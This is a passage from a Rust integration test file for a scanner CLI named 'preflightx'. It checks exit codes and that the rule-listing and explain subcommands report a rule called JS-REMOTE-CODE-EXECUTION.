    let invalid = run(&[".", "--online"]);

    assert_eq!(missing.status.code(), Some(2));
    assert_eq!(invalid.status.code(), Some(3));
}

#[test]
fn rule_commands_explain_implemented_detection() {
    let list = run(&["rules"]);
    let show = run(&["rules", "show", "JS-REMOTE-CODE-EXECUTION"]);
    let explain = run(&["explain", "JS-REMOTE-CODE-EXECUTION"]);
    let unknown = run(&["rules", "show", "UNKNOWN-RULE"]);

    assert_eq!(list.status.code(), Some(0));
    assert!(String::from_utf8_lossy(&list.stdout).contains("JS-REMOTE-CODE-EXECUTION"));
    assert_eq!(show.status.code(), Some(0));
    assert_eq!(show.stdout, explain.stdout);
    assert_eq!(unknown.status.code(), Some(3));
}

fn run(arguments: &[&str]) -> std::process::Output {
    Command::new(env!("CARGO_BIN_EXE_preflightx"))
        .args(arguments)
        .output()
        .unwrap()
}

fn temporary_directory(label: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "preflightx-cli-{label}-{}-{nonce}",
        std::process::id()
    ));
    fs::create_dir(&path).unwrap();
    path
}
